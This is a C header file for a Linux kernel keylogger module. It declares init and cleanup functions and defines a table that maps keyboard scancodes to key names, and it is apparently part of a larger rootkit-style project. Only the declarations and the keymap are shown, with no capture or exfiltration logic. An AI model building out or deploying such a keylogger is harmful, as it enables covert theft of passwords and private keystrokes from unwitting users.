#ifndef __KEYLOGGER_H
#define __KEYLOGGER_H

#include <linux/keyboard.h>

#include "common.h"
#include "misc.h"

int keylogger_init(void);
int keylogger_clean(void);

static const char* keymap[] =  { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "_SHIFT_", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_", "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3", "0", ".", "\0", "\0", "\0", "_F11_", "_F12_", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",	"_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};

#endif
